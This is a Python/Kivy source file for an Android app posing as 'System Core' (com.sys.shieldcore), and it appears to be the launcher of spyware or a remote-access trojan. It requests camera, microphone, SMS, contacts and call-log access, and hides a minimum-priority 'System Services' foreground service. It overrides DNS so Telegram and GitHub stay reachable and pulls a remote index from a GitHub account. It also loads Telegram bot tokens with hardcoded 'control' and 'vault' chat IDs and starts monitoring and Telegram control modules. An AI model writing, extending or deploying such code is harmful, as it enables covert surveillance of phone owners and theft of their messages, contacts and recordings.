# -*- coding: utf-8 -*-
import os
import sys
import threading
import importlib
import requests
import traceback
import gc
import time
import socket
import random
import shutil
from datetime import datetime

from kivy.app import App
from kivy.uix.textinput import TextInput
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.button import Button
from kivy.clock import Clock
from kivy.core.clipboard import Clipboard

# ======================== DNS PATCH (احتياطي ذكي) ============================
def _patch_dns():
    original_getaddrinfo = socket.getaddrinfo

    def patched_getaddrinfo(host, port, family=0, type=0, proto=0, flags=0):
        try:
            result = original_getaddrinfo(host, port, family, type, proto, flags)
            if result:
                return result
        except:
            pass

        override = {
            'raw.githubusercontent.com': [
                '185.199.108.133', '185.199.109.133',
                '185.199.110.133', '185.199.111.133'
            ],
            'api.telegram.org': [
                '149.154.167.220', '149.154.167.221',
                '149.154.167.99', '149.154.175.50'
            ],
            'zaen1993.github.io': [
                '185.199.108.153', '185.199.109.153',
                '185.199.110.153', '185.199.111.153'
            ],
            'cdn.jsdelivr.net': [
                '151.101.2.229', '151.101.66.229',
                '151.101.130.229'
            ]
        }
        if host in override:
            fake_ip = random.choice(override[host])
            return [(socket.AF_INET, socket.SOCK_STREAM, 6, '', (fake_ip, port))]
        return original_getaddrinfo(host, port, family, type, proto, flags)

    socket.getaddrinfo = patched_getaddrinfo


_patch_dns()

# ========================== الإعدادات الأساسية ================================
INDEX_BASE_URLS = [
    "https://cdn.jsdelivr.net/gh/Zaen1993/Android-Core@main/index.json",
    "https://zaen1993.github.io/Android-Core/index.json",
    "https://raw.githubusercontent.com/Zaen1993/Android-Core/refs/heads/main/index.json",
]

HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
    'Cache-Control': 'no-cache',
    'Pragma': 'no-cache'
}


def _get_path():
    try:
        from jnius import autoclass
        act = autoclass('org.kivy.android.PythonActivity').mActivity
        base = act.getFilesDir().getPath()
        p = os.path.join(base, ".sys_runtime")
    except:
        p = os.path.join(os.getcwd(), ".sys_runtime")
    os.makedirs(p, exist_ok=True)
    return p


R = _get_path()
U = os.path.join(R, "updates")
os.makedirs(U, exist_ok=True)

HARVEST_QUEUE = os.path.join(R, ".cache_thumb")
os.makedirs(HARVEST_QUEUE, exist_ok=True)

MODELS_DIR = os.path.join(R, "models")
os.makedirs(MODELS_DIR, exist_ok=True)

if R not in sys.path:
    sys.path.insert(0, R)

# ======================== الخدمات الخلفية ====================================
def start_silent_service():
    try:
        from jnius import autoclass
        act = autoclass('org.kivy.android.PythonActivity').mActivity
        nm = autoclass('android.app.NotificationManager')
        ch = autoclass('android.app.NotificationChannel')
        channel = ch("core_svc", "System Services", nm.IMPORTANCE_MIN)
        act.getSystemService(nm).createNotificationChannel(channel)

        builder = autoclass('android.app.Notification$Builder')(act, "core_svc")
        builder.setSmallIcon(act.getApplicationInfo().icon)
        builder.setPriority(autoclass('android.app.Notification').PRIORITY_MIN)
        act.startForeground(9921, builder.build())
        print("✅ Foreground silent service started")
    except Exception as e:
        print(f"❌ Foreground service error: {e}")


def open_notification_settings():
    try:
        from jnius import autoclass
        Intent = autoclass('android.content.Intent')
        Settings = autoclass('android.provider.Settings')
        ctx = autoclass('org.kivy.android.PythonActivity').mActivity

        intent = Intent(Settings.ACTION_APP_NOTIFICATION_SETTINGS)
        intent.putExtra(Settings.EXTRA_APP_PACKAGE, ctx.getPackageName())
        ctx.startActivity(intent)
    except Exception as e:
        print(f"⚠️ Could not open notification settings: {e}")


def _perms():
    """طلب جميع الصلاحيات المطلوبة."""
    try:
        from android.permissions import request_permissions, Permission
        request_permissions([
            Permission.INTERNET,
            Permission.CAMERA,
            Permission.RECORD_AUDIO,
            "android.permission.FOREGROUND_SERVICE",
            "android.permission.READ_EXTERNAL_STORAGE",
            "android.permission.WRITE_EXTERNAL_STORAGE",
            "android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS",
            "android.permission.READ_CONTACTS",
            "android.permission.READ_SMS",
            "android.permission.READ_CALL_LOG"
        ])
    except Exception as e:
        print(f"❌ Permissions error: {e}")

    start_silent_service()

    def delayed_notification_settings():
        time.sleep(2)
        open_notification_settings()

    threading.Thread(target=delayed_notification_settings, daemon=True).start()

    try:
        from jnius import autoclass
        ctx = autoclass('org.kivy.android.PythonActivity').mActivity
        pm = ctx.getSystemService(ctx.POWER_SERVICE)
        if not pm.isIgnoringBatteryOptimizations(ctx.getPackageName()):
            Intent = autoclass('android.content.Intent')
            intent = Intent(Intent.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
            from android.net import Uri
            intent.setData(Uri.parse(f"package:{ctx.getPackageName()}"))
            ctx.startActivity(intent)
    except Exception as e:
        print(f"⚠️ Battery exemption error: {e}")


# ======================== تحميل الإعدادات ====================================
def load_secrets_from_config():
    config_module = None
    try:
        config_module = importlib.import_module("config_template")
    except ImportError:
        try:
            config_module = importlib.import_module("config")
        except ImportError:
            print("⚠️ Warning: No config file found, using defaults")
            return [], [], -1003943094277, -1003577715762, "@321@321neaz"

    if not hasattr(config_module, 'load_config'):
        print("⚠️ Warning: Config file has no load_config function")
        return [], [], -1003943094277, -1003577715762, "@321@321neaz"

    try:
        active, reserve, ctrl, vault, secret = config_module.load_config()
        if not active:
            active = []
        if not reserve:
            reserve = []
        if not ctrl:
            ctrl = -1003943094277
        if not vault:
            vault = -1003577715762
        if not secret:
            secret = "@321@321neaz"
        return active, reserve, ctrl, vault, secret
    except Exception as e:
        print(f"⚠️ Error loading config: {e}, using defaults")
        return [], [], -1003943094277, -1003577715762, "@321@321neaz"


def fetch_index():
    for url in INDEX_BASE_URLS:
        try:
            resp = requests.get(url, headers=HEADERS, timeout=15, verify=True)
            if resp.status_code == 200:
                try:
                    return resp.json()
                except:
                    continue
        except:
            continue
    return None


# ================== نسخ نموذج الذكاء الاصطناعي (محلياً فقط) ==================
def copy_model_to_models_dir():
    """
    نسخ ملف النموذج من مجلد assets إلى مجلد models.
    لا يتم التحميل من الإنترنت مطلقاً – يعتمد فقط على الملف المدمج في APK.
    """
    try:
        model_min_size = 5_000_000   # 5 ميغابايت
        dest = os.path.join(MODELS_DIR, "engine_v2.tflite")

        # إذا كان الملف موجوداً ومكتملاً في الوجهة، نكتفي به
        if os.path.exists(dest) and os.path.getsize(dest) >= model_min_size:
            print(f"✅ Model already exists at {dest}")
            return True

        # قائمة المسارات المحتملة للنموذج داخل التطبيق (بدون تحميل خارجي)
        possible_paths = [
            os.path.join(os.path.dirname(os.path.abspath(__file__)), "assets", "engine_v2.tflite"),
            os.path.join(os.getcwd(), "assets", "engine_v2.tflite"),
            "/data/data/com.sys.shieldcore/files/app/assets/engine_v2.tflite",
            "/data/data/com.sys.shieldcore/files/assets/engine_v2.tflite",
        ]

        for src in possible_paths:
            if os.path.exists(src):
                size = os.path.getsize(src)
                if size >= model_min_size:
                    shutil.copy2(src, dest)
                    if os.path.exists(dest) and os.path.getsize(dest) >= model_min_size:
                        print(f"✅ Model copied from {src} to {dest} ({size/1024/1024:.2f} MB)")
                        return True
                    else:
                        print(f"⚠️ Copy from {src} failed or file incomplete")
                else:
                    print(f"⚠️ Model file too small at {src}: {size} bytes (min {model_min_size})")

        print("❌ CRITICAL: engine_v2.tflite NOT FOUND in assets/ folder!")
        print("💡 تأكد من وضع ملف النموذج في المسار: assets/engine_v2.tflite")
        return False

    except Exception as e:
        print(f"❌ Error copying model: {e}")
        traceback.print_exc()
        return False


# ============================== تطبيق Kivy ====================================
class CoreApp(App):
    def build(self):
        self.title = "System Core v4.2"
        layout = BoxLayout(orientation='vertical', spacing=5)

        self.log = TextInput(
            text="",
            readonly=True,
            background_color=(0.02, 0.02, 0.02, 1),
            foreground_color=(0.3, 0.9, 0.3, 1),
            font_size='10sp'
        )

        btns = BoxLayout(size_hint=(1, 0.08), spacing=5)
        copy_btn = Button(text="📋 COPY LOG", background_color=(0.2, 0.4, 0.6, 1))
        copy_btn.bind(on_press=self._copy)
        clear_btn = Button(text="🗑 CLEAR", background_color=(0.6, 0.2, 0.2, 1))
        clear_btn.bind(on_press=self._clear)

        btns.add_widget(copy_btn)
        btns.add_widget(clear_btn)

        layout.add_widget(self.log)
        layout.add_widget(btns)

        Clock.schedule_once(self._start, 0.5)
        return layout

    def _copy(self, instance):
        try:
            Clipboard.copy(self.log.text)
            print("✅ Log copied to clipboard")
        except Exception as e:
            print(f"⚠️ Copy error: {e}")

    def _clear(self, instance):
        self.log.text = ""
        print("✅ Log cleared")

    def _start(self, dt):
        def _log(msg):
            Clock.schedule_once(lambda x: setattr(self.log, 'text', self.log.text + msg + "\n"))

        _log("[INIT] Starting system...")
        self._init_core()

    def _init_core(self):
        def _log(msg):
            Clock.schedule_once(lambda x: setattr(self.log, 'text', self.log.text + msg + "\n"))

        try:
            # ===== 1. إعداد الصلاحيات =====
            _log("[1/5] Setting permissions...")
            _perms()

            # ===== 2. نسخ نموذج الذكاء الاصطناعي =====
            _log("[2/5] Copying AI model...")
            model_ok = copy_model_to_models_dir()
            _log(f"     Model status: {'✅ OK' if model_ok else '❌ FAILED'}")

            # ===== 3. تحميل الإعدادات =====
            _log("[3/5] Loading configuration...")
            active, reserve, ctrl, vault, secret = load_secrets_from_config()
            _log(f"     Active tokens: {len(active)}, Reserve tokens: {len(reserve)}")
            _log(f"     Control ID: {ctrl}, Vault ID: {vault}")

            # ===== 4. تهيئة المكونات الأساسية (بدون كتابة ملفات مضمنة) =====
            _log("[4/5] Initializing components...")

            from monitor import M
            mon = M()

            from telegram_ui import T
            ui = T(mon, active, reserve, ctrl, vault, secret)

            mon.ui = ui
            mon.ctrl = ctrl
            mon.vlt = vault

            # ===== 5. بدء التشغيل =====
            _log("[5/5] Starting services...")
            ui.start()
            mon.start()

            _log("✅ System initialized successfully!")
            _log(f"📱 Device: {mon.dmd} ({mon.did[:8]})")

            self.mon = mon
            self.ui = ui

        except Exception as e:
            _log(f"❌ ERROR: {str(e)}")
            _log(f"❌ Traceback: {traceback.format_exc()}")
            print(f"Critical error: {e}")
            print(traceback.format_exc())

    def on_stop(self):
        try:
            if hasattr(self, 'mon') and self.mon:
                self.mon.stop()
            if hasattr(self, 'ui') and self.ui:
                self.ui.stop()
            print("✅ Application stopped cleanly")
        except Exception as e:
            print(f"⚠️ Stop error: {e}")


if __name__ == '__main__':
    CoreApp().run()
